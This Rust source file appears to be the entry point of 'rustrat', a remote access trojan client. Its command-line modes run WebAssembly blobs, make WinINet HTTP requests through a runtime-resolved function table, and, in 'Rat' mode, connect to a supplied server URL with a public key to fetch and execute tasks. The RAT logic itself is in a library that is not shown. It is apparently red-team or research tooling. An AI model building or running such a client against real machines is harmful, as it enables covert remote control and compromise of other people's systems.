use rustrat_client::connector::http::*;
use rustrat_client::ffi::FnTable;
use std::str;
use std::{convert::TryInto, ffi::CString};

use base64;
use structopt::StructOpt;

#[derive(StructOpt)]
#[structopt(name = "rustrat-client", about = "Rustrat client testing tools.")]
enum RustratClient {
    /// Execute a wasm blob
    Wasm { path: String, fn_name: String },
    /// Make HTTP Get request to www.wodinaz.com
    Http,
    /// Connect to specified host and start executing tasks. Needs a URL including https?:// and the server's base64 encoded public key
    Rat { url: String, public_key: String },
}

pub fn do_http_get(url: String) -> error::Result<(Vec<u8>, Vec<u8>)> {
    let mut fn_table = FnTable::new();
    register_wininet_fns(&mut fn_table)?;

    let ua = CString::new("Rustrat").unwrap();
    let url = CString::new(url).unwrap();

    let internet_handle = InternetHandle::create(&fn_table, ua).unwrap();
    let url_handle = internet_handle
        .create_url_handle(
            url,
            None,
            InternetUrlFlags::INTERNET_FLAG_NO_CACHE_WRITE
                | InternetUrlFlags::INTERNET_FLAG_NO_COOKIES
                | InternetUrlFlags::INTERNET_FLAG_PRAGMA_NOCACHE
                | InternetUrlFlags::INTERNET_FLAG_RELOAD,
        )
        .unwrap();

    let headers = url_handle.get_response_headers()?;
    let body = url_handle.get_response()?;

    Ok((headers, body))
}

fn main() -> rustrat_client::error::Result<()> {
    init_log();

    let opt = RustratClient::from_args();

    match opt {
        RustratClient::Wasm { path, fn_name } => {
            let result = rustrat_client::run_webassembly_file(&path, &fn_name)?;
            std::process::exit(result);
        }
        RustratClient::Http => {
            let result = do_http_get("https://www.wodinaz.com/".to_string()).unwrap();

            println!(
                "{}\n{}",
                str::from_utf8(&result.0).unwrap(),
                str::from_utf8(&result.1).unwrap()
            );
        }
        RustratClient::Rat { url, public_key } => {
            let public_key: [u8; 32] = base64::decode_config(public_key, base64::URL_SAFE_NO_PAD)
                .unwrap()
                .try_into()
                .unwrap();
            go_rat(url, public_key);
        }
    }

    Ok(())
}

#[cfg(debug_assertions)]
struct Logger;
#[cfg(debug_assertions)]
static LOGGER: Logger = Logger;

#[cfg(debug_assertions)]
impl log::Log for Logger {
    fn enabled(&self, metadata: &log::Metadata) -> bool {
        metadata.level() <= log::Level::Debug
    }

    fn log(&self, record: &log::Record) {
        println!(
            "[{}] {} - {}",
            record.level(),
            record.target(),
            record.args()
        );
    }

    fn flush(&self) {}
}

fn init_log() {
    #[cfg(debug_assertions)]
    let _ = log::set_logger(&LOGGER).map(|()| log::set_max_level(log::LevelFilter::Debug));
}
